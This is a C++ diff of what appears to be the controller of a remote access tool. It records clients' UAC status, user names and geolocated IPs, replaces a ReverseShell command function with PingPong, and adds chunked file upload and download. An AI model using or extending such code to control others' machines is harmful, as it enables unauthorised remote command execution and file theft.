@@ -49,7 +49,7 @@ public:
 		Clients[ID].info.UAC = data["UAC"];
 		Clients[ID].info.UserName = data["UserName"];
 		Clients[ID].info.Versione = data["Versione"];
-		Clients[ID].info.Compatibilita = (data["VersioneCompatibile"].is_null()) ? 0 : (int)data["VersioneCompatibile"];
+		Clients[ID].info.CompatibleVer = (data["VersioneCompatibile"].is_null()) ? 0 : (int)data["VersioneCompatibile"];
 
 		Clients[ID].info.IP = TcpIP::GetIP(Sock);
 		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);
@@ -134,16 +134,127 @@ public:
 		return TcpIP::SendString(Sock, "restart");
 	}
 	
-	static string ReverseShell(SOCKET Sock, string Cmd)
+	static string PingPong(SOCKET Sock, string Send)
 	{
 		string Buff = "";
 		
-		if (!TcpIP::SendString(Sock, Cmd))
+		if (!TcpIP::SendString(Sock, Send))
 			return "";
 		
 		if (!TcpIP::RecvString(Sock, Buff))
 			return "";
 		
 		return Buff;
+	}
+
+	static bool UploadFileWithLoading(SOCKET Sock, string FileName, string FileContent, int BarSize = 20)
+	{
+		CLInterface cli;
+		string Buff;
+
+		if (!TcpIP::SendString(Sock, FileName))
+			return false;
+
+		if (!TcpIP::SendString(Sock, to_string(FileContent.size())))
+			return false;
+
+		if (FileContent.size() > 100)
+		{
+			int ChunkSize = FileContent.size() / 100;
+			int ChunkNumber = FileContent.size() / ChunkSize;
+
+			cli.FullBar(BarSize);
+
+			for (int i = 0; i < ChunkNumber; i++)
+			{
+				if (i + 1 == ChunkNumber)
+				{
+					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i)))
+					{
+						cli.StopBar();
+						return false;
+					}
+				}
+				else
+					if (!TcpIP::SendString(Sock, FileContent.substr(ChunkSize * i, ChunkSize)))
+					{
+						cli.StopBar();
+						return false;
+					}
+
+				cli.LoadingPercentage = (int)((float)((i + 1) / (float)ChunkNumber) * 100);
+			}
+
+			cli.StopBar();
+		}
+		else
+		{
+			cli.FullBar(BarSize);
+
+			if (!TcpIP::SendString(Sock, FileContent))
+			{
+				cli.StopBar();
+				return false;
+			}
+
+			cli.LoadingPercentage = 100;
+			cli.StopBar();
+		}
+
+		return true;
+	}
+
+	static bool DownloadFileWithLoading(SOCKET Sock, string &FileName, string &FileContent, int BarSize = 20)
+	{
+		CLInterface cli;
+		string strFileSize;
+		string Buff = "";
+
+		if (!TcpIP::RecvString(Sock, FileName))
+			return false;
+
+		if (!TcpIP::RecvString(Sock, strFileSize))
+			return false;
+
+		int FileSize = stoi(strFileSize);
+
+		if (FileSize > 100)
+		{
+			int ChunkSize = FileSize / 100;
+			int ChunkNumber = FileSize / ChunkSize;
+
+			cli.FullBar(BarSize);
+
+			for (int i = 0; i < ChunkNumber; i++)
+			{
+				if (!TcpIP::RecvString(Sock, Buff))
+				{
+					cli.StopBar();
+					return false;
+				}
+
+				FileContent += Buff;
+				Buff.clear();
+
+				cli.LoadingPercentage = (float)((i + 1) / ChunkNumber) * 100;
+			}
+
+			cli.StopBar();
+		}
+		else
+		{
+			cli.FullBar(BarSize);
+
+			if (!TcpIP::RecvString(Sock, FileContent))
+			{
+				cli.StopBar();
+				return false;
+			}
+
+			cli.LoadingPercentage = 100;
+			cli.StopBar();
+		}
+
+		return true;
 	}
 };
